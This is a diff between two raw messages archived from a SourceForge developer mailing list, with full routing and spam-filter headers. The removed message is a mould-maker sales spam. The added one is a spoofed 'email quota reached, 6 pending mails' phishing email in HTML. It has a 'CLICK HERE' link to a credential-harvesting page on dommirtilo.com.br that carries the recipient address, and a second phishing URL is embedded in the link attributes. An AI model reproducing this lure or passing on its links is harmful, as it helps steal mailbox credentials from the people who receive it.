@@ -2,89 +2,93 @@ Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
 X-Original-To: lists+industrypack-devel@lfdr.de
 Delivered-To: lists+industrypack-devel@lfdr.de
 Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
-	by mail.lfdr.de (Postfix) with ESMTPS id 7F21A441AB3
-	for <lists+industrypack-devel@lfdr.de>; Mon,  1 Nov 2021 12:32:28 +0100 (CET)
-Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
-	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.94.2)
+	by mail.lfdr.de (Postfix) with ESMTPS id D8F77443C1A
+	for <lists+industrypack-devel@lfdr.de>; Wed,  3 Nov 2021 05:08:42 +0100 (CET)
+Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
+	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.94.2)
 	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
-	id 1mhVYA-00058n-VS
-	for lists+industrypack-devel@lfdr.de; Mon, 01 Nov 2021 11:32:26 +0000
+	id 1mi7Zq-0008Se-Db
+	for lists+industrypack-devel@lfdr.de; Wed, 03 Nov 2021 04:08:41 +0000
 Received: from [172.30.20.202] (helo=mx.sourceforge.net)
- by sfs-ml-2.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
+ by sfs-ml-1.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
  TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.94.2)
- (envelope-from <yamasakura@nyc.odn.ne.jp>) id 1mhVY9-00058Y-Er
- for industrypack-devel@lists.sourceforge.net; Mon, 01 Nov 2021 11:32:25 +0000
+ (envelope-from <supplier@service.alibaba.com>) id 1mi7Zp-0008SX-1f
+ for industrypack-devel@lists.sourceforge.net; Wed, 03 Nov 2021 04:08:39 +0000
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
- d=sourceforge.net; s=x; h=Content-Type:Mime-Version:Message-ID:Subject:To:
- From:Date:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
+ d=sourceforge.net; s=x; h=Subject:Content-Transfer-Encoding:Content-Type:
+ MIME-Version:Message-ID:Date:To:From:Sender:Reply-To:Cc:Content-ID:
  Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
  :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
  List-Subscribe:List-Post:List-Owner:List-Archive;
- bh=c5u2NGSusfLKgHAwqsP9G3ZjplPp60VUTt3xLkkIQmE=; b=QbCLYt9RSe6P3b1f/ovEDhKNpU
- Cvgj9RsfGTw4I5J+zUYPpbmVRxoSZldaQ3DWnz8bwwgxWKatvt1Wfwot76bzwXxbsJZ+sVjtqBmPa
- V5BIJ704lMx+pmhww5Zhm2Amo2B4Dz8MQrYuX3bK9qZfARzIxatM7XAwnT15e3kCYjZI=;
+ bh=H+zT6kxacKo7ENp0vJnNed6BtjTATOYWzTqERsR+q+Y=; b=aWESu8TST58yiRbOsUKR3xJzq5
+ RQUoHfmoly6BBimoxutpJSZR1Z+RkQhD/GeaiRdajVVyXLVmQ4Etz62Xio8vHhNIw74WVYt+d4EII
+ 55sOCCuEZQeN6K9M81dbqMN3s/ezRMWbCdr0fepsXVbZ+4EHHNsQ+GixbGNp5D854wyw=;
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
  ;
- h=Content-Type:Mime-Version:Message-ID:Subject:To:From:Date:Sender:Reply-To
- :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
+ h=Subject:Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:
+ Date:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date:
  Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
  References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
- List-Owner:List-Archive; bh=c5u2NGSusfLKgHAwqsP9G3ZjplPp60VUTt3xLkkIQmE=; b=I
- pvFDR5NwgW9r+kR9NHn82K2Np21bg49th18+LPx6PnXSdRKZyRWHrrPM9w0lvYNAQTlmcnxRhZSCj
- 4hOYz/YXILfQdc5faQIjy62Dn49uAHFYonyD4GRCblhen2WrJl9HFzHbzRNkm6QC4XEQMv/UKmTl3
- pROKFfPiW52UdeBc=;
-Received: from mta101.odn.ne.jp ([143.90.14.65] helo=cmta101.odn.ne.jp)
- by sfi-mx-1.v28.lw.sourceforge.com with esmtp (Exim 4.92.3)
- id 1mhVY3-00BRue-ED
- for industrypack-devel@lists.sourceforge.net; Mon, 01 Nov 2021 11:32:25 +0000
-Received: from vmsa105.odn.ne.jp by cmsa105.odn.ne.jp with ESMTP
- id <20211101112239916.ITUI.71279.cmsa105.odn.ne.jp@msa105.odn.ne.jp>
+ List-Owner:List-Archive; bh=H+zT6kxacKo7ENp0vJnNed6BtjTATOYWzTqERsR+q+Y=; b=g
+ jbrOgqResak+LHYEHk0KoQ+uKuYQRqtGe3pSdIjIEmSXjXGjbq3kHMydenU3QWkttDzZkXYFcosFv
+ nYrZ/53bfXNCQKAvR0CqyHS2rd0/wCeC8HU7+jBvr+Qq1Pf6VAebj2dP9BqcyFk0qcq0gVGO7cBwE
+ qVRMCLTqNZ+yjgFA=;
+Received: from 199.ip-54-37-139.eu ([54.37.139.199] helo=vps486827.ovh.net)
+ by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.92.3)
+ id 1mi7Zm-0001Gs-JO
+ for industrypack-devel@lists.sourceforge.net; Wed, 03 Nov 2021 04:08:39 +0000
+Received: from service.alibaba.com (unknown [172.93.220.46])
+ by vps486827.ovh.net (Postfix) with ESMTP id DA6326BFC9
  for <industrypack-devel@lists.sourceforge.net>;
- Mon, 1 Nov 2021 20:22:39 +0900
-Received: from msrg1051.rgserv.odn.ne.jp by vmsa105.odn.ne.jp with ESMTP
- id <20211101112239912.TTSP.68922.vmsa105.odn.ne.jp@msa105.odn.ne.jp>
- for <industrypack-devel@lists.sourceforge.net>;
- Mon, 1 Nov 2021 20:22:39 +0900
-X-Odn-Service: VIRUS-CHECKED
-Received: from 139.com (45.142.155.33) by msrg1051.rgserv.odn.ne.jp (5.8.426)
- id 604EF3280C510F8B for industrypack-devel@lists.sourceforge.net;
- Mon, 1 Nov 2021 20:22:39 +0900
-Date: Mon, 1 Nov 2021 19:17:13 +0800
-From: "Yaya" <deepmould@163.com>
-To: <industrypack-devel@lists.sourceforge.net>
-Message-ID: <20211101191718211140@nyc.odn.ne.jp>
-X-mailer: Foxmail 6, 13, 102, 15 [cn]
-Mime-Version: 1.0
-X-Spam-Score: 5.1 (+++++)
+ Wed,  3 Nov 2021 01:57:12 +0100 (CET)
+From: lists.sourceforge.net <supplier@service.alibaba.com>
+To: industrypack-devel@lists.sourceforge.net
+Date: 3 Nov 2021 01:57:12 +0100
+Message-ID: <20211103015712.E17B61764B487F72@service.alibaba.com>
+MIME-Version: 1.0
+X-Spam-Score: 8.3 (++++++++)
 X-Spam-Report: Spam detection software,
- running on the system "util-spamd-2.v13.lw.sourceforge.com", 
- has NOT identified this incoming email as spam.  The original
+ running on the system "util-spamd-1.v13.lw.sourceforge.com", 
+ has identified this incoming email as possible spam.  The original
  message has been attached to this so you can view it or label
  similar future email.  If you have any questions, see
  the administrator of that system for details.
- Content preview:  Dear friend, Nice day! Do you need to customize different
- plastic projects? We are a professional mold tooling and prototype maker in
- Dongguan,China. We can provide one stop service from part design t [...] 
- Content analysis details:   (5.1 points, 6.0 required)
+ Content preview:  Hello industrypack-devel@lists.sourceforge.net, You have 6
+ Pending incoming Mails on your industrypack-devel@lists.sourceforge.net
+ server. This is because your email quota has reached; 
+ Content analysis details:   (8.3 points, 6.0 required)
  pts rule name              description
  ---- ---------------------- --------------------------------------------------
- -0.0 RCVD_IN_MSPIKE_H2      RBL: Average reputation (+2)
- [143.90.14.65 listed in wl.mailspike.net]
- 0.2 HEADER_FROM_DIFFERENT_DOMAINS From and EnvelopeFrom 2nd level
- mail domains are different
- 0.0 FREEMAIL_FROM          Sender email is commonly abused enduser mail
- provider [deepmould[at]163.com]
+ 1.9 URIBL_ABUSE_SURBL      Contains an URL listed in the ABUSE SURBL
+ blocklist [URIs: dommirtilo.com.br]
+ 0.0 URIBL_PH_SURBL         Contains an URL listed in the PH SURBL blocklist
+ [URIs: dommirtilo.com.br]
+ 0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
+ blocked.  See
+ http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
+ for more information. [URIs: dommirtilo.com.br]
+ 0.0 RCVD_IN_MSPIKE_L5      RBL: Very bad reputation (-5)
+ [54.37.139.199 listed in bl.mailspike.net]
  0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
- -0.0 SPF_PASS               SPF: sender matches SPF record
- 2.6 DEAR_FRIEND            BODY: Dear Friend? That's not very dear!
+ 0.9 SPF_FAIL               SPF: sender does not match SPF record (fail)
+ [SPF failed: Please see http://www.openspf.org/Why?s=mfrom;
+ id=supplier%40service.alibaba.com; ip=54.37.139.199;
+ r=util-spamd-1.v13.lw.sourceforge.com]
+ 1.1 DATE_IN_PAST_03_06     Date: is 3 to 6 hours before Received: date
  0.0 HTML_MESSAGE           BODY: HTML included in message
- 2.0 PYZOR_CHECK            Listed in Pyzor
- (https://pyzor.readthedocs.io/en/latest/)
- 0.0 FSL_BULK_SIG           Bulk signature with no Unsubscribe
- 0.2 FREEMAIL_FORGED_FROMDOMAIN 2nd level domains in From and
- EnvelopeFrom freemail headers are different
-X-Headers-End: 1mhVY3-00BRue-ED
-Subject: Re: [Industrypack-devel] 1hib3eku
+ 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
+ 0.0 HTML_FONT_LOW_CONTRAST BODY: HTML font color similar or
+ identical to background
+ 0.4 RDNS_DYNAMIC           Delivered to internal network by host with
+ dynamic-looking rDNS
+ 2.0 PDS_FROM_NAME_TO_DOMAIN From:name looks like To:domain
+ 0.0 RCVD_IN_MSPIKE_BL      Mailspike blacklisted
+ 1.5 PDS_FRNOM_TODOM_NAKED_TO Naked to From name equals to Domain
+ 0.4 KHOP_HELO_FCRDNS       Relay HELO differs from its IP's reverse DNS
+X-VA-Spam-Flag: YES
+X-Spam-Flag: YES
+X-Headers-End: 1mi7Zm-0001Gs-JO
+Subject: [Industrypack-devel] [SPAM] 6 Pending incoming Mails on your Server
 X-BeenThere: industrypack-devel@lists.sourceforge.net
 X-Mailman-Version: 2.1.21
 Precedence: list
@@ -96,67 +100,151 @@ List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
 List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
 List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
  <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
-Reply-To: deepmould@163.com
-Content-Type: multipart/mixed; boundary="===============9196589883682304845=="
+Content-Type: multipart/mixed; boundary="===============5296966684525932486=="
 Errors-To: industrypack-devel-bounces@lists.sourceforge.net
 
-This is a multi-part message in MIME format.
+--===============5296966684525932486==
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
 
---===============9196589883682304845==
-Content-Type: multipart/alternative;
-	boundary="=====003_Dragon012512155502_====="
+<!DOCTYPE HTML>
 
-This is a multi-part message in MIME format.
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em;">
+<p>
 
---=====003_Dragon012512155502_=====
-Content-Type: text/plain;
-	charset="utf-8"
-Content-Transfer-Encoding: base64
+</p><h1 align=3D"center" style=3D'color: rgb(33, 33, 33); text-transform: n=
+one; text-indent: 0px; letter-spacing: normal; font-family: wf_segoe-ui_nor=
+mal,"Segoe UI","Segoe WP",Tahoma,Arial,sans-serif,serif,EmojiFont; font-sty=
+le: normal; word-spacing: 0px; white-space: normal; background-color: rgb(2=
+55, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal; t=
+ext-decoration-style: initial; text-decoration-color: initial;'><span style=
+=3D"color: rgb(227, 69, 0);"></span></h1>
+<p align=3D"left" style=3D'color: rgb(33, 33, 33); text-transform: none; te=
+xt-indent: 0px; letter-spacing: normal; font-family: wf_segoe-ui_normal,"Se=
+goe UI","Segoe WP",Tahoma,Arial,sans-serif,serif,EmojiFont; font-size: 15px=
+; font-style: normal; font-weight: 400; word-spacing: 0px; white-space: nor=
+mal; background-color: rgb(255, 255, 255); font-variant-ligatures: normal; =
+font-variant-caps: normal; text-decoration-style: initial; text-decoration-=
+color: initial;'>&nbsp;Hello <a target=3D"_blank">
+industrypack-devel@lists.sourceforge.net</a><b>,</b><br><br>You have 6 Pend=
+ing incoming Mails on your <a>industrypack-devel@lists.sourceforge.net</a>&=
+nbsp;server.&nbsp;</p>
+<p align=3D"left" style=3D'color: rgb(33, 33, 33); text-transform: none; te=
+xt-indent: 0px; letter-spacing: normal; font-family: wf_segoe-ui_normal,"Se=
+goe UI","Segoe WP",Tahoma,Arial,sans-serif,serif,EmojiFont; font-size: 15px=
+; font-style: normal; font-weight: 400; word-spacing: 0px; white-space: nor=
+mal; background-color: rgb(255, 255, 255); font-variant-ligatures: normal; =
+font-variant-caps: normal; text-decoration-style: initial; text-decoration-=
+color: initial;'>
+This is because your email quota has reached;<span>&nbsp;</span><br>&nbsp;<=
+/p>
+<table style=3D'color: rgb(33, 33, 33); text-transform: none; text-indent: =
+0px; letter-spacing: normal; font-family: wf_segoe-ui_normal,"Segoe UI","Se=
+goe WP",Tahoma,Arial,sans-serif,serif,EmojiFont; font-size: 15px; font-styl=
+e: normal; font-weight: 400; word-spacing: 0px; white-space: normal; backgr=
+ound-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-varian=
+t-caps: normal; text-decoration-style: initial; text-decoration-color: init=
+ial;' border=3D"0"><tbody><tr>
+<td width=3D"250" height=3D"2" bgcolor=3D"#ff0000"><span style=3D"color: wh=
+ite;"><b>99% Used</b></span></td></tr></tbody></table><p>
+<br style=3D'color: rgb(33, 33, 33); text-transform: none; text-indent: 0px=
+; letter-spacing: normal; font-family: wf_segoe-ui_normal,"Segoe UI","Segoe=
+ WP",Tahoma,Arial,sans-serif,serif,EmojiFont; font-size: 15px; font-style: =
+normal; font-weight: 400; word-spacing: 0px; white-space: normal; backgroun=
+d-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-c=
+aps: normal; text-decoration-style: initial; text-decoration-color: initial=
+;'>
+<span style=3D'color: rgb(33, 33, 33); text-transform: none; text-indent: 0=
+px; letter-spacing: normal; font-family: wf_segoe-ui_normal,"Segoe UI","Seg=
+oe WP",Tahoma,Arial,sans-serif,serif,EmojiFont; font-size: 15px; font-style=
+: normal; font-weight: 400; word-spacing: 0px; float: none; display: inline=
+; white-space: normal; background-color: rgb(255, 255, 255); font-variant-l=
+igatures: normal; font-variant-caps: normal; text-decoration-style: initial=
+; text-decoration-color: initial;'>
+and will soon exceed it's limit.</span><br style=3D'color: rgb(33, 33, 33);=
+ text-transform: none; text-indent: 0px; letter-spacing: normal; font-famil=
+y: wf_segoe-ui_normal,"Segoe UI","Segoe WP",Tahoma,Arial,sans-serif,serif,E=
+mojiFont; font-size: 15px; font-style: normal; font-weight: 400; word-spaci=
+ng: 0px; white-space: normal; background-color: rgb(255, 255, 255); font-va=
+riant-ligatures: normal; font-variant-caps: normal; text-decoration-style: =
+initial; text-decoration-color: initial;'>
+<br style=3D'color: rgb(33, 33, 33); text-transform: none; text-indent: 0px=
+; letter-spacing: normal; font-family: wf_segoe-ui_normal,"Segoe UI","Segoe=
+ WP",Tahoma,Arial,sans-serif,serif,EmojiFont; font-size: 15px; font-style: =
+normal; font-weight: 400; word-spacing: 0px; white-space: normal; backgroun=
+d-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-c=
+aps: normal; text-decoration-style: initial; text-decoration-color: initial=
+;'>
+<span style=3D'color: rgb(33, 33, 33); text-transform: none; text-indent: 0=
+px; letter-spacing: normal; font-family: wf_segoe-ui_normal,"Segoe UI","Seg=
+oe WP",Tahoma,Arial,sans-serif,serif,EmojiFont; font-size: 15px; font-style=
+: normal; font-weight: 400; word-spacing: 0px; float: none; display: inline=
+; white-space: normal; background-color: rgb(255, 255, 255); font-variant-l=
+igatures: normal; font-variant-caps: normal; text-decoration-style: initial=
+; text-decoration-color: initial;'>
+Follow the URL below to upgrade your quota to 60GB for free to avoid loss o=
+f email data.</span>
+<br style=3D'color: rgb(33, 33, 33); text-transform: none; text-indent: 0px=
+; letter-spacing: normal; font-family: wf_segoe-ui_normal,"Segoe UI","Segoe=
+ WP",Tahoma,Arial,sans-serif,serif,EmojiFont; font-size: 15px; font-style: =
+normal; font-weight: 400; word-spacing: 0px; white-space: normal; backgroun=
+d-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-c=
+aps: normal; text-decoration-style: initial; text-decoration-color: initial=
+;'>
+<br style=3D'color: rgb(33, 33, 33); text-transform: none; text-indent: 0px=
+; letter-spacing: normal; font-family: wf_segoe-ui_normal,"Segoe UI","Segoe=
+ WP",Tahoma,Arial,sans-serif,serif,EmojiFont; font-size: 15px; font-style: =
+normal; font-weight: 400; word-spacing: 0px; white-space: normal; backgroun=
+d-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-c=
+aps: normal; text-decoration-style: initial; text-decoration-color: initial=
+;'>
+<font color=3D"#8080ff" style=3D'text-transform: none; text-indent: 0px; le=
+tter-spacing: normal; font-family: wf_segoe-ui_normal,"Segoe UI","Segoe WP"=
+,Tahoma,Arial,sans-serif,serif,EmojiFont; font-size: 15px; font-style: norm=
+al; font-weight: 400; word-spacing: 0px; white-space: normal; background-co=
+lor: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps:=
+ normal; text-decoration-style: initial; text-decoration-color: initial;'>
+<a style=3D"color: rgb(1, 134, 186);" href=3D"https://dommirtilo.com.br/all=
+llibaba/index.php?i=3Di&amp;0=3Dindustrypack-devel@lists.sourceforge.net" t=
+arget=3D"_blank" rel=3D"noreferrer" data-saferedirecturl=3D"https://www.goo=
+gle.com/url?q=3Dhttps://vishwakarmasanghamsecunderabad.org/dmssss/index.php=
+?i%3Di%260%3D%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D1635877904005=
+000&amp;usg=3DAFQjCNHk4MVuz7mhsNj447tkbAvD_jkLMQ">CLICK HERE&nbsp;</a></fon=
+t>
+<span style=3D'color: rgb(33, 33, 33); text-transform: none; text-indent: 0=
+px; letter-spacing: normal; font-family: wf_segoe-ui_normal,"Segoe UI","Seg=
+oe WP",Tahoma,Arial,sans-serif,serif,EmojiFont; font-size: 15px; font-style=
+: normal; font-weight: 400; word-spacing: 0px; float: none; display: inline=
+; white-space: normal; background-color: rgb(255, 255, 255); font-variant-l=
+igatures: normal; font-variant-caps: normal; text-decoration-style: initial=
+; text-decoration-color: initial;'>&nbsp;</span></p>
+<p style=3D'color: rgb(33, 33, 33); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: wf_segoe-ui_normal,"Segoe UI","Segoe =
+WP",Tahoma,Arial,sans-serif,serif,EmojiFont; font-size: 15px; font-style: n=
+ormal; font-weight: 400; word-spacing: 0px; white-space: normal; background=
+-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-ca=
+ps: normal; text-decoration-style: initial; text-decoration-color: initial;=
+'>
+2021 Webmail&nbsp;Security Service All Rights Reserved.<br></p><p>
 
-RGVhciBmcmllbmQsDQpOaWNlIGRheSENCkRvIHlvdSBuZWVkIHRvIGN1c3RvbWl6ZSBkaWZmZXJl
-bnQgcGxhc3RpYyBwcm9qZWN0cz8NCldlIGFyZSBhIHByb2Zlc3Npb25hbCBtb2xkIHRvb2xpbmcg
-YW5kIHByb3RvdHlwZSBtYWtlciBpbiBEb25nZ3VhbixDaGluYS4NCldlIGNhbiBwcm92aWRlIG9u
-ZSBzdG9wIHNlcnZpY2UgZnJvbSBwYXJ0IGRlc2lnbiB0byBwYXJ0IGFzc2VtYmxpbmcuDQpQbGVh
-c2UgbGV0IHVzIGtub3cgaWYgd2UgY291bGQgaGF2ZSBhIGNoYW5jZSB0byB3b3JrIHdpdGggeW91
-ciB0ZWFtLg0KVGhhbmtzIGZvciB5b3VyIHZhbHVhYmxlIHRpbWUgJiBiZXN0IHJlZ2FyZHMuIA0K
-X19fX19fX19fX19fX19fX19fX19fX19fX19fX18NCkRlZXAgTW91bGQgQ28uLExURA0KWWF5YSBI
-d2FuZw0KU2FsZXMgU3VwZXJ2aXNvcg0KU2t5cGU6IERlZXBtb3VsZA0KQWRkOiBCIEJsb2NrLE5v
-IDIxLE5hbnhpbmcgVGhyZWUgU3RyZWV0LE5hbmZhbmcgSW5kdXN0cmlhbCBQYXJrLEJlaWNlLEh1
-bWVuLERvbmdndWFuLENoaW5hLg==
 
---=====003_Dragon012512155502_=====
-Content-Type: text/html;
-	charset="utf-8"
-Content-Transfer-Encoding: base64
-
-PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMCBUcmFuc2l0aW9uYWwv
-L0VOIj4NCjxIVE1MPjxIRUFEPg0KPE1FVEEgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0
-Zi04IiBodHRwLWVxdWl2PUNvbnRlbnQtVHlwZT4NCjxNRVRBIG5hbWU9R0VORVJBVE9SIGNvbnRl
-bnQ9Ik1TSFRNTCA4LjAwLjc2MDEuMTc1MTQiPjwvSEVBRD4NCjxCT0RZPg0KPFA+RGVhciBmcmll
-bmQsPEJSPk5pY2UgZGF5ITwvUD4NCjxQPkRvIHlvdSBuZWVkIHRvIGN1c3RvbWl6ZSBkaWZmZXJl
-bnQgcGxhc3RpYyBwcm9qZWN0cz88QlI+V2UgYXJlIGEgcHJvZmVzc2lvbmFsIA0KbW9sZCB0b29s
-aW5nIGFuZCBwcm90b3R5cGUgbWFrZXIgaW4gRG9uZ2d1YW4sQ2hpbmEuPEJSPldlIGNhbiBwcm92
-aWRlIG9uZSBzdG9wIA0Kc2VydmljZSBmcm9tIHBhcnQgZGVzaWduIHRvIHBhcnQgYXNzZW1ibGlu
-Zy48L1A+DQo8UD5QbGVhc2UgbGV0IHVzIGtub3cmbmJzcDtpZiB3ZSBjb3VsZCBoYXZlIGEgY2hh
-bmNlIHRvIHdvcmsgd2l0aCB5b3VyIHRlYW0uPC9QPg0KPFA+VGhhbmtzIGZvciB5b3VyIHZhbHVh
-YmxlIHRpbWUgJmFtcDsgYmVzdCANCnJlZ2FyZHMuJm5ic3A7PEJSPl9fX19fX19fX19fX19fX19f
-X19fX19fX19fX19fPC9QPg0KPFA+RGVlcCZuYnNwO01vdWxkIENvLixMVEQ8QlI+WWF5YSBId2Fu
-ZzxCUj5TYWxlcyBTdXBlcnZpc29yPEJSPlNreXBlOiANCkRlZXBtb3VsZDxCUj5BZGQ6IEImbmJz
-cDtCbG9jayxObyAyMSxOYW54aW5nIFRocmVlIFN0cmVldCxOYW5mYW5nIEluZHVzdHJpYWwgDQpQ
-YXJrLEJlaWNlLEh1bWVuLERvbmdndWFuLENoaW5hLjwvUD48L0JPRFk+PC9IVE1MPg0K
-
---=====003_Dragon012512155502_=====--
+</p>
 
 
+</body></html>
 
---===============9196589883682304845==
+
+--===============5296966684525932486==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
 Content-Disposition: inline
 
 
---===============9196589883682304845==
+--===============5296966684525932486==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -167,6 +255,4 @@ Industrypack-devel mailing list
 Industrypack-devel@lists.sourceforge.net
 https://lists.sourceforge.net/lists/listinfo/industrypack-devel
 
---===============9196589883682304845==--
-
-
+--===============5296966684525932486==--
